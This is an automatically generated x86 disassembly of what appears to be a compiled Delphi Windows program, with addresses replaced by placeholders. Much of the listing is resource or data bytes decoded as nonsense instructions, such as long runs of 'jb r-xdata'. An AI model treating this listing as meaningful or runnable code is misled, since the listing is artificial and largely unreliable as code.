jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404154
sub_44bc5c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44bb64
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44bb64
mov eax [ ebp - 0x8 ]
pop edx
call sub_407bdc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bcbc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
sub_44bd09
cld
inc ebp
add ah bl
add [ esi ] eax
mov ah bh
inc ebp
add al bl
add [ esi ] eax
test ah bh
inc ebp
add [ edi + edi * 8 + 0x45 ] cl
add [ eax - 0x63ffba04 ] al
add [ esi ] eax
jl r-xdata
inc esi
add [ esp + edi * 8 + 0x45 ] bh
add [ ecx + eax + 0x46 ] ah
add [ eax - 0x4 ] bh
inc ebp
add [ edx + eax ] ah
inc esi
add [ esp + edi * 8 + 0x45 ] dh
add al bh
add [ esi ] eax
jo r-xdata
inc ebp
inc esi
add [ eax - 0x4 ] dh
inc ebp
add [ edi + edi * 8 + 0x45 ] bl
add [ esp + edi * 8 + 0x45 ] ch
add [ edi + edi * 8 + 0x45 ] ch
add [ eax - 0x4 ] ch
inc ebp
add [ edi + edi * 8 - 0x74aaffbb ] ah
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bdc3
retn
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_4049e8
mov eax rw-data
call sub_403f6c
sub_44bdc8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d18
mov eax [ r-xdata ]
call sub_41307c
mov eax [ r-xdata ]
call sub_41311c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130c8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130c8
mov eax [ r-xdata ]
call sub_412fc0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421dbc
mov [ rw-data ] eax
sub_44bf4e
call sub_45bf97
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
jmp r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_41a7f8
sub [ eax ] al
add bh bh
adc cl ch
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
mov esi 0x80044
add bh bh
or [ eax ] al
add bh bh
in al 0xe1
inc esp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
loop r-xdata
loop r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
call [ edx + ebp * 8 - 0x1557ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
dec [ eax ]
0x10044 0x0
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
popad
outsb
add [ gs : bx + si ] dl
outsd
insb
outsd
jb r-xdata
imul ebp [ esi ] 0x2c004010
add [ eax ] al
[ ecx + ebp * 8 ]
into
jb r-xdata
jb r-xdata
mov eax 0x6b848188
cmpsd [ esi ] [ edi ]
hlt
sbb eax 0xaf6fb51d
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
jecxz r-xdata
retn 0xe2e2
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
add [ eax - 0x33ffbc4a ] bh
xor [ eax ] eax
call 0x584501c6
in eax dx
inc esp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + eax * 8 ] al
inc esp
add [ eax ] cl
ja r-xdata
add [ gs : eax ] dl
add eax 0x676e6152
adc [ eax ] al
or al 0x0
add bh bh
inc esp
jmp r-xdata
xor eax 0xbe31a61
loop r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
push ds
mov ch 0x6f
jb r-xdata
loop r-xdata
loop r-xdata
inc esp
add [ eax - 0x50 ] bh
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ edi + ebp * 4 ] dh
inc ebx
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x722c0043 ] dh
inc ebx
add [ eax + 0x75 ] al
inc ebx
add ah ch
jae r-xdata
add [ eax - 0x1bffbc52 ] al
cmp eax 0x94140041
inc ebx
add [ eax ] ch
push 0x9b340043
out 0x43 al
dec esi
outsd
jb r-xdata
sbb eax 0xb51db4b2
mov dl 0xbd
mov esp 0x7272212b
jb r-xdata
jb r-xdata
fdivr [ edx + 0x6b84b888 ]
popad
sbb ah bl
cmpsd [ esi ] [ edi ]
mov al bl
jb r-xdata
jecxz r-xdata
imul edx [ 0x1d25f00a ] 0xf226611d
jb r-xdata
push cs
jb r-xdata
jb r-xdata
scasd [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
imul esp [ edi + 0x690bbc1e ] 0x721d1d38
add [ ecx + edi * 4 ] ah
inc ebx
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add al al
fiadd [ ebx ]
add al 0xee
inc esp
add [ eax + esi * 8 - 0xd17ffbc ] dh
inc esp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
inc ebx
add [ ebp + esi * 4 + 0x43 ] dl
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ eax ] dl
hlt
add [ eax - 0x1a ] bl
inc ebx
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
retn 0x1d2a
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ edx + 0x6b842469 ] dh
jb r-xdata
mov edx 0x6b84b888
jb r-xdata
sub [ ebx ] cl
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
or dh al
jb r-xdata
out 0xe2 al
jb r-xdata
outsd
xchg esi eax
mov [ ecx - 0xb58947c ] al
mov bl 0xb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1db1b294
or eax edx
jb r-xdata
inc ebx
add [ eax + 0x71 ] al
inc ebx
add [ ecx + ebx * 4 + 0x41 ] bh
sub [ eax + 0x43 ] ch
add [ ebx + ebx * 4 ] dh
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
and al 0x84
jb r-xdata
jb r-xdata
jb r-xdata
sub al 0x69
xchg edi eax
0x5abf6b84 0x3869
jb r-xdata
cld
imul esp [ esp + eax * 4 ] 0x845ebf6b
imul esi [ edi - 0x60947bde ] 0x28
or esp ebx
jb r-xdata
loop r-xdata
mov eax 0x3ea76b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ah [ edx + 0x2bb9bcbd ]
and eax 0x26611d1d
or ecx [ esi + eax ]
sub esp [ ecx ]
jb r-xdata
jge r-xdata
adc eax 0x1d25f00a
sbb eax 0xbf22661
or al 0x6
loop r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
popfd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 - 0x131fffbf ] al
inc esp
add [ ecx + 0x43 ] ch
add [ eax - 0x2bffbc1a ] cl
in eax 0x43
add [ esi - 0x2417ffbd ] bl
inc ebx
add [ eax ] cl
fadd [ ebx ]
and cl bl
inc ebx
add ah ah
inc ebx
add al ch
inc ebx
add ah ah
xchg ebp eax
inc ebx
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
inc ecx
jae r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x48947ba2 ] 0x22
test [ ebx - 0x61 ] ch
jb r-xdata
push edx
mov ah 0xb2
or edi [ ebp - 0x1e ]
outsd
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
and al [ ebx + ebp * 2 - 0x1cf4d761 ]
test [ ebx - 0x41 ] ch
imul esp [ edi - 0x6fbf4c2 ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ es : esi + eax ]
jb r-xdata
mov bh 0x3e
loop r-xdata
jb r-xdata
sub ch [ ecx + 0x2a ]
scasd [ edi ]
jb r-xdata
sbb eax 0x8ae68832
mov edi 0xb76b845e
jb r-xdata
jb r-xdata
or edi [ ebx + 0x2e ]
imul esi [ edi - 0x58947b84 ] 0x48
or eax [ ecx + edi * 8 ]
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
mov ah 0xea
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax ] cl
rol [ eax + eax + 0x3 ] 0xc
push esp
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
rcr [ eax + 0x44c1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
retn 0x44
mov edi 0xb238695a
jb r-xdata
jb r-xdata
or eax [ ecx + edi * 8 ]
mov [ eax + 0x3ea76b84 ] bh
pop esi
jb r-xdata
mov eax 0x1d044d0b
jb r-xdata
adc dh [ edx + 0xb4aa76f ]
jb r-xdata
outsb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
imul esp [ edi - 0x6e7745ca ] 0x69
xor al [ ebx + ebp * 2 + 0x6a0b34b7 ]
add [ 0xffffffffa769721d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
cmp al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi + 0x6b84b9e0 ] 0xffffffbf
ja r-xdata
jb r-xdata
or ecx [ esi + eax ]
jb r-xdata
jb r-xdata
xor cl dl
cmp [ edi - 0x59 ] ebp
test [ ss : ebx - 0x69 ] ch
imul ebp [ edx ] 0x6b8422d1
mov edi 0xa76b8454
jb r-xdata
test [ ebx - 0x49 ] ch
mov bh 0x69
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x69
jb r-xdata
jb r-xdata
imul edi [ eax ] 0x842469b2
jb r-xdata
jb r-xdata
imul esp [ eax ] 0x1d10d10b
sbb eax 0x35e666ed
sbb eax 0xeaaf691d
leave
sub ch [ eax - 0xe ]
or esp ebp
cmp al 0x1d
sbb eax 0x72727272
jb r-xdata
imul ecx [ esi ] 0xe0ce0e63
inc eax
imul edi [ edi + 0x1aaf6b1e ] 0xb
je r-xdata
outsd
jb r-xdata
jb r-xdata
mov bh 0x69
push cs
or eax [ edx + 0x3a ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
out dx al
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
or esp [ edi - 0x4ae2e2d8 ]
mov ch 0xb5
fisubr [ ebx ]
sbb eax 0xb22d11d
mul dl
fldenv [ esi + edx * 8 + 0x28b867ed ]
mov edx 0x32699188
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
outsd
or ebp [ esi + 0x3c ]
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
push es
jb r-xdata
cmpsd [ esi ] [ edi ]
and [ edx + 0x72 ] esi
shl [ edx ] 0x1
test [ ebx - 0x41 ] ch
mov [ edx + 0x1d3c5c0b ] ah
sbb eax 0x1ea76f72
mov dl 0x1d
push cs
jl r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
dec edx
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx ] ecx
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xa769721d
mov [ ecx + 0x6b843269 ] dl
mov bh 0x34
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
imul esp [ edi + 0x1e5b0b48 ] 0x1d
sbb eax 0x72727272
and ch ch
add [ 0xffffffffaf6fb51d ] bl
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ edi - 0x10 ]
jb r-xdata
jb r-xdata
and ah dh
mov edi 0x9f6b8400
jb r-xdata
jb r-xdata
sub al 0x38
jb r-xdata
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0x1d3a420b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0x6f
jb r-xdata
salc
jb r-xdata
jb r-xdata
or ebp [ edx + 0x1 ]
imul esi [ edx ] 0x34b76b84
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ 0xffffffffb41d1d27 ]
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
shl [ edx ] 0x1
mov [ 0x2bb9bcbd ] al
jb r-xdata
jb r-xdata
or ebx [ ebx + 0x1e ]
sbb eax 0x7272721d
jb r-xdata
mov bh 0x7c
jb r-xdata
jb r-xdata
loop r-xdata
arpl [ esi ] cx
sbb eax 0x1eaf6fb5
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
dec eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
test [ ebx - 0x61 ] ch
jb r-xdata
jb r-xdata
sbb eax 0xa3a66f1d
jb r-xdata
rcr [ 0xffffffffa2b76b84 ] 0x1
imul edi [ edi - 0x60947c00 ] 0x16
jb r-xdata
jb r-xdata
or ebp [ eax + edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or [ ecx ] 0xffffffb5
inc eax
jb r-xdata
imul ebx [ edx ] 0x6b843269
jb r-xdata
enter 0x1d2a 0x1d
jb r-xdata
mov eax [ 0xbe2e2ea ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
mov cl [ edi ]
sbb [ ecx + 0x316a0b74 ] eax
sbb eax 0x7272721d
jb r-xdata
sub al 0x1d
sbb eax 0x1d2b500a
sbb eax 0x14671269
in eax dx
daa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
dec eax
jb r-xdata
in al 0xe2
push ebp
mov cl 0xb4
popad
lahf
push ds
loop r-xdata
outsd
jb r-xdata
or ecx eax
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ edx + ecx ]
jb r-xdata
lahf
jb r-xdata
test [ ebx - 0x41 ] ch
push es
mov [ ebp + 0x1d382c0b ] al
outsd
jb r-xdata
loop r-xdata
add [ ebx + ebp * 2 + 0x1dd1169f ] al
test [ ebx - 0x49 ] ch
mov [ 0x30d13a69 ] al
or edx ebp
jb r-xdata
jb r-xdata
sbb al 0xb
cmp [ 0xffffffffa3a66f1d ] bl
jb r-xdata
or esp [ edx ]
mov [ edi + 0x26af6b84 ] dl
jb r-xdata
jb r-xdata
jb r-xdata
push es
mov eax 0xdb1d1d28
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
test [ ebx - 0x49 ] ch
xor al 0xb
push 0x1
mov edx 0x32699188
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
fucomp st3
loop r-xdata
sbb eax 0x2c370bb4
sbb eax 0x2b500a1d
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
ja r-xdata
and ch ch
imul edi [ edx ] 0x3d0b1d67
imul esp [ ebx ] 0xb306784
jpo r-xdata
popad
and al ah
popad
or ah al
and cl [ bp + di ]
imul edi [ ebx ] 0x1d
sbb eax 0xf355ed72
mov cl 0xb4
or eax [ esi + 0x8 ]
sbb eax 0x7272721d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
imul sp cx 0xe2e2
sbb eax 0x1db21e97
jb r-xdata
mov edi 0xb367ed1e
movsb [ edi ] [ esi ]
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jb r-xdata
sbb eax 0x7272721d
sbb ch [ ecx + 0x32 ]
test [ ebx - 0x41 ] ch
mov edx 0x14a76b84
shl [ edx ] 0x1
mov [ esi + 0x1d039f0b ] ah
sbb eax 0xedeb1861
jmp r-xdata
or bl [ 0xffffffffed72721d ]
jb r-xdata
jb r-xdata
mov [ 0x2a480b1c ] eax
jb r-xdata
imul edi [ edx ] 0xd50b30d1
imul ebx [ edi - 0x7be22eea ] 0x6b
mov bh 0xa2
jb r-xdata
jb r-xdata
sbb eax 0x1ca3a66f
jb r-xdata
xor al 0xd1
and cl [ ebx ]
cmp [ 0x7272721d ] bl
cmpsd [ esi ] [ edi ]
sbb cl [ ebx ]
push edx
xor eax 0x72721d1d
jb r-xdata
imul edi [ edi - 0x50947bb0 ] 0x24
mov [ ebx - 0x1d061df5 ] cl
loop r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
jb r-xdata
mov ch 0xa
jb r-xdata
sbb eax 0x1ebfdb1d
jb r-xdata
fldenv [ esi + edx * 8 + 0x28b867ed ]
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
or esi edx
jb r-xdata
out 0x88 al
aam 0xb9
test [ ebx - 0x41 ] ch
test [ ebx - 0x41 ] ch
in al 0x88
salc
mov edi 0x6b84b9e0
mov edi 0xb9d488e6
jb r-xdata
jb r-xdata
loop r-xdata
mov cl [ ecx - 0x4b5f5f18 ]
loop r-xdata
imul edi [ edx ] 0xf2bf6b84
sar [ ecx ] 0x1
or ebx [ ebp + 0x72e2e2e1 ]
jb r-xdata
in eax dx
sbb eax 0x6712691d
adc al 0xed
or dl [ eax + 0x2b ]
or esi [ edi ]
add eax 0xb41d1d27
imul esp [ ebx ] 0x36a76b84
jb r-xdata
sbb eax 0x86ad378a
shl [ ebp + 0x1d3e650b ] 0x1d
jb r-xdata
or [ ebp + 0x1d3cdb0a ] esi
jb r-xdata
mov al [ eax + 0x44 ]
out dx al
sub esp [ ecx ]
jb r-xdata
sbb eax 0x66ed7272
jmp 0x1e28a721
jb r-xdata
test [ ebx - 0x49 ] ch
ror [ eax + 0x21d60b86 ] 0x1
sbb eax 0x8872721d
sar [ ebx + 0x2369c788 ] 0x84
or ecx [ eax + 0x2a ]
jb r-xdata
imul edi [ edi + 0xb858806 ] 0x2c
cmpsb [ esi ] [ edi ]
jb r-xdata
push es
or edx [ ebx + 0x5 ]
jb r-xdata
push cs
sbb eax 0x7272721d
jb r-xdata
imul edi [ es : 0x52bf6b84 ] 0x84bb3a69
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
fstp [ ebx - 0x52c875e3 ]
jb r-xdata
sub [ 0xffffffff971db21d ] bl
fstp [ edi - 0x4c9812e2 ]
jb r-xdata
salc
jb r-xdata
mov eax [ 0xffffffffffffe2ea ]
jb r-xdata
and eax [ ebx + ebp * 2 - 0x7745c959 ]
jb r-xdata
imul esi [ edi - 0x1af447fa ] 0xf
sbb eax 0x7272721d
and [ 0x22d1721d ] ebx
jb r-xdata
mov ecx 0xeabf6b84
mov ecx 0xe6bf6b84
mov ah dl
mov ecx 0xe4bf6b84
mov dh dl
jb r-xdata
mov ebp 0x212bb9bc
jb r-xdata
jb r-xdata
jb r-xdata
lodsb [ esi ]
loope r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
or bl bl
jb r-xdata
jb r-xdata
mov bl cl
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xa2b76b84
mov eax 0xd0b76b84
mov [ esi + 0x1d21d60b ] al
sbb eax 0xc0887272
mov ebx 0x2369c788
jb r-xdata
loop r-xdata
push ebx
jb r-xdata
sbb eax 0x72727272
jb r-xdata
in eax dx
push ds
adc [ 0x7221bc1d ] ebx
jb r-xdata
imul edi [ 0x52bf6b84 ] 0x84bb3a69
jb r-xdata
jb r-xdata
imul ebp [ edi - 0x7bc296da ] 0x6b
jb r-xdata
jb r-xdata
xchg al al
mov ch 0xb
sbb eax 0x7272721d
sbb eax 0xad378a1d
jb r-xdata
in eax dx
push ds
jb r-xdata
mov eax 0xdb1d1d28
jb r-xdata
0xc80be2e2 0x1d2a
jb r-xdata
sbb eax 0x2bd186b4
sbb eax 0xbc22d172
sub esp [ ecx ]
jb r-xdata
jb r-xdata
push esp
test [ ebx - 0x59 ] ch
mov [ ebx + ebp * 2 + 0x6f0b06b7 ] es
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
jb r-xdata
imul ebx [ edx ] 0x1d01690a
sbb eax 0x69f22661
cmp ah [ edi + 0x1d ]
or edi [ 0xffffffffed1d1d38 ]
loop r-xdata
test cl bl
sub eax 0xe2e467ed
and eax 0xe2e31ea7
xor cl [ eax - 0x2d1d751a ]
cmp al 0x1d
jb r-xdata
and ch ch
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0xe2e9130b
loop r-xdata
mov dl 0xa
std
add ebx [ 0xffffffffee26611d ]
jb r-xdata
jb r-xdata
add ebx [ 0xfffffffff6280b1d ]
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
adc [ 0xb72721d ] bl
sbb eax 0x26551d1d
jb r-xdata
add eax 0x551d1d1d
jb r-xdata
jb r-xdata
jb r-xdata
push eax
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
and al 0x88
mov ecx [ ebx ]
loop r-xdata
scasd [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov dh [ edi ]
lodsd [ esi ]
mov bh 0x69
push cs
or ecx [ edx + ecx + 0x1d ]
mov bl 0x28
jb r-xdata
sub [ 0x1ebfdb1d ] bl
jb r-xdata
loop r-xdata
loop r-xdata
mul dl
jb r-xdata
mov esp 0x7272212b
shl [ edx ] 0x1
popad
sbb bl [ 0xb2377ed ]
iretd
mov dl 0x1d
mov ah 0x86
shr [ ebx ] 0x1
mov edi 0x843c69ea
imul edi [ edi + 0x1ac60be8 ] 0x1d
jb r-xdata
jb r-xdata
loop r-xdata
test [ ebx - 0x41 ] ch
cmp al [ ebx + ebp * 2 + 0x39d1f2bf ]
jb r-xdata
popad
push cs
out dx al
mov cl 0xb5
and ch ch
inc bp
add bl [ 0x2aaf6f1d ]
outsd
cmpsd [ esi ] [ edi ]
dec edx
or dh [ esi - 0x10 ]
loop r-xdata
pop ax
jb r-xdata
pop esi
loop r-xdata
jb r-xdata
or eax esp
jb r-xdata
adc al 0xed
jb r-xdata
push 0xffcf
sbb eax 0x1269311d
xchg ebx eax
push ds
or esp ecx
shl dl 0x1
loop r-xdata
cmpsd [ esi ] [ edi ]
mov cl 0xb2
sbb eax 0x88ee2661
loop r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
out 0xaa al
jb r-xdata
sbb eax 0xe2f6280b
loop r-xdata
imul ebx [ esi + 0x14d1066f ] 0x280b2c69
sbb eax 0x72727272
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
sbb eax 0xe2e22655
jb r-xdata
sbb eax 0xe226551d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov edi 0xbb3a6952
jb r-xdata
jb r-xdata
imul esp [ edi + 0x35520b1a ] 0x1d
sbb eax 0x72727272
imul edi [ edx ] 0xbf6b84bb
cmp eax 0x52bf6b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xed1ebfdb
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ esp + eax * 4 ] 0xbe8bf6b
jb r-xdata
jb r-xdata
jb r-xdata
sbb [ 0x1db4b21d ] ebx
mov ch 0xb2
mov ebp 0x72212bbc
jb r-xdata
push ds
mov esp 0x1d38690b
sbb eax 0x96676f72
xchg esp eax
mov dl 0xb1
sbb eax 0xe2e26275
or dl ah
sbb eax 0x72727272
imul ecx [ esi ] 0x1d0a4c0b
or ch [ ebx ]
sbb [ 0xdb88a1d ] bl
and ch ch
dec edx
or al [ ebp - 0x10 ]
loop r-xdata
outsd
scasd [ edi ]
cmp ch [ edi - 0x59 ]
and cl [ bp + di ]
test dl bl
loop r-xdata
loop r-xdata
xor eax 0xa4e2e2d4
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
adc al 0xd1
and cl [ eax + 0x39f0ba6 ]
sbb eax 0xeb18611d
loop r-xdata
jb r-xdata
shl dl 0x1
jb r-xdata
test [ ebx - 0x51 ] ch
push ds
mov bl [ esi + 0x39 ]
jb r-xdata
salc
jb r-xdata
jb r-xdata
push edx
in al 0xe2
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ edi - 0x2ecd967c ] 0x22
jb r-xdata
test [ ebx - 0x59 ] ch
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
mov dl 0x88
cld
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or eax [ eax ]
hlt
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or esp [ edi + 0x721d1d10 ]
push ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x44c596ae ] 0xffffff84
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x6971db2
jb r-xdata
jb r-xdata
sbb eax 0x22d1721d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
test [ ebx - 0x41 ] ch
call 0x1d60883c
jb r-xdata
jb r-xdata
jb r-xdata
fsubrp st0
loop r-xdata
dec ecx
jb r-xdata
inc ebp
mov bh 0x69
push cs
or edx [ ebx ]
jmp 0xffffffff93638aa2
or ebp [ esi + 0x721d1d03 ]
jb r-xdata
imul ebx [ edx ] 0x66ed1d67

mov dl dh
popad
out dx al
or edx [ edx - 0x1c ]
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov [ esi + 0x1d15d60b ] al
loop r-xdata
iretd
jb r-xdata
loop r-xdata
jb r-xdata
